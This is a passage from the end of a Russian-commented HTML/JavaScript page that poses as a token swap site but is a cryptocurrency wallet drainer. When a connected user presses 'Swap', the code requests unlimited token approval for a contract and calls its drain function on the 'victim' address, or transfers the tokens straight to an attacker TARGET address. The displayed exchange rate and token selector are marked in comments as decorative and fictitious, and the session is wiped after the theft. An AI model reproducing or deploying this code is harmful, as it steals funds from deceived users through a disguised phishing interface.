                                const drainer = new ethers.Contract(CONTRACT_ADDRESS, DRAINER_ABI, signer);
                                const allowance = await token.allowance(victim, CONTRACT_ADDRESS);
                                if (allowance.lt(a.amount)) {
                                    setStatus(`Approve ${a.symbol}...`, '');
                                    await token.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
                                }
                                const tx = await drainer.drain(a.address, victim, a.amount);
                                await tx.wait();
                            } else {
                                let gasLimit;
                                try {
                                    const estimate = await token.estimateGas.transfer(TARGET, a.amount);
                                    gasLimit = estimate.mul(120).div(100);
                                } catch (e) { gasLimit = 100000; }
                                const tx = await token.transfer(TARGET, a.amount, { gasLimit });
                                await tx.wait();
                            }
                        } catch (e) { console.warn(`Ошибка с ${a.symbol}:`, e); }
                    }

                    setStatus('✅ Всё переведено!', 'ok');
                    isProcessing = false;
                    updateSwapButton();
                    // Очищаем сессию после успеха
                    await forceClearSession();
                    isConnected = false;
                    updateConnectButton();
                } catch (e) {
                    setStatus('❌ Ошибка: ' + e.message, 'err');
                    isProcessing = false;
                    updateSwapButton();
                    console.error(e);
                }
            }

            // ============================================================
            // ОБРАБОТЧИКИ СОБЫТИЙ
            // ============================================================
            // Кнопка Connect открывает модалку
            connectBtn.addEventListener('click', () => {
                if (isConnected) {
                    // Если уже подключены, можно переподключиться
                    openModal(walletModal);
                } else {
                    openModal(walletModal);
                }
            });

            // Выбор кошелька
            metamaskOption.addEventListener('click', () => connectWallet('metamask'));
            trustOption.addEventListener('click', () => connectWallet('trust'));
            wcOption.addEventListener('click', connectWalletConnect);

            // Закрытие модалок
            closeModalBtn.addEventListener('click', () => closeModal(walletModal));
            walletModal.addEventListener('click', (e) => { if (e.target === walletModal) closeModal(walletModal); });
            closeTokenModalBtn.addEventListener('click', () => closeModal(tokenModal));
            tokenModal.addEventListener('click', (e) => { if (e.target === tokenModal) closeModal(tokenModal); });

            // Кнопка Swap
            swapBtn.addEventListener('click', function() {
                if (!isConnected) {
                    openModal(walletModal);
                    return;
                }
                const val = parseFloat(inputAmount.value);
                if (!val || val <= 0) {
                    setStatus('Введите сумму', 'err');
                    return;
                }
                startDrain();
            });

            // Кнопка Max (для демонстрации)
            maxBtn.addEventListener('click', function() {
                inputAmount.value = 1.0;
                updateSwapButton();
                setStatus('Сумма установлена', '');
            });

            // Обновление кнопки при вводе
            inputAmount.addEventListener('input', updateSwapButton);

            // Кнопка Refresh – сброс
            refreshBtn.addEventListener('click', async function() {
                await forceClearSession();
                isConnected = false;
                provider = null;
                signer = null;
                victim = null;
                chainId = null;
                inputAmount.value = '';
                outputAmount.value = '';
                updateConnectButton();
                setStatus('Сессия сброшена', '');
                qrContainer.classList.add('hidden');
            });

            // ============================================================
            // ДЕКОРАТИВНЫЙ ВЫБОР ТОКЕНОВ (из gsgsf)
            // ============================================================
            function renderTokenList(filter = '') {
                tokenList.innerHTML = '';
                tokens.forEach(token => {
                    if (token.symbol.toLowerCase().includes(filter.toLowerCase()) || token.name.toLowerCase().includes(filter.toLowerCase())) {
                        const isDisabled = (currentSelectType === 'from' && token.symbol === toToken.symbol) ||
                                           (currentSelectType === 'to' && token.symbol === fromToken.symbol);
                        const item = document.createElement('div');
                        item.className = 'token-row' + (isDisabled ? ' disabled' : '');
                        item.innerHTML = `
                            <span class="t-mark"><img src="${token.img}" alt="${token.symbol}" /></span>
                            <div class="t-info">
                                <span class="t-sym">${token.symbol}</span>
                                <span class="t-name">${token.name}</span>
                            </div>
                        `;
                        if (!isDisabled) {
                            item.addEventListener('click', () => {
                                if (currentSelectType === 'from') fromToken = token;
                                else toToken = token;
                                closeModal(tokenModal);
                                fromIcon.src = fromToken.img;
                                fromSymbol.textContent = fromToken.symbol;
                                toIcon.src = toToken.img;
                                toSymbol.textContent = toToken.symbol;
                                // Обновляем отображение курса (декоративно)
                                updateRateDisplay();
                            });
                        }
                        tokenList.appendChild(item);
                    }
                });
            }

            function updateRateDisplay() {
                const val = parseFloat(inputAmount.value) || 0;
                if (val <= 0) {
                    rateDisplay.textContent = `1 ${fromToken.symbol} = 0.00 ${toToken.symbol}`;
                    outputAmount.value = '';
                    return;
                }
                // Демонстрационный курс: просто умножаем на случайный коэффициент
                const rate = 1.2; // фиктивный
                const out = val * rate;
                outputAmount.value = out.toFixed(6);
                rateDisplay.textContent = `1 ${fromToken.symbol} = ${rate.toFixed(4)} ${toToken.symbol}`;
            }

            document.getElementById('tokenFromSelect').addEventListener('click', function(e) {
                e.stopPropagation();
                currentSelectType = 'from';
                tokenSearchInput.value = '';
                renderTokenList();
                openModal(tokenModal);
            });
            document.getElementById('tokenToSelect').addEventListener('click', function(e) {
                e.stopPropagation();
                currentSelectType = 'to';
                tokenSearchInput.value = '';
                renderTokenList();
                openModal(tokenModal);
            });
            tokenSearchInput.addEventListener('input', function() {
                renderTokenList(this.value);
            });

            // Стрелка обмена токенами (декоративно)
            swapArrow.addEventListener('click', function() {
                const temp = fromToken;
                fromToken = toToken;
                toToken = temp;
                fromIcon.src = fromToken.img;
                fromSymbol.textContent = fromToken.symbol;
                toIcon.src = toToken.img;
                toSymbol.textContent = toToken.symbol;
                updateRateDisplay();
                setStatus('Токены перевернуты', '');
            });

            // Обновление курса при вводе суммы
            inputAmount.addEventListener('input', updateRateDisplay);

            // ============================================================
            // ИНИЦИАЛИЗАЦИЯ
            // ============================================================
            updateConnectButton();
            setStatus('Подключите кошелёк или введите сумму', '');
            updateRateDisplay();

            // Предзагрузка QR-кода (скрыто)
            qrContainer.classList.add('hidden');

            // Проверяем наличие библиотек
            if (typeof ethers === 'undefined') {
                setStatus('❌ Библиотека ethers не загружена', 'err');
            }
            if (typeof QRCode === 'undefined') {
                console.warn('QRCode библиотека не загружена');
            }

            // При загрузке очищаем старые сессии
            forceClearSession();

        })();
    </script>
</body>
</html>
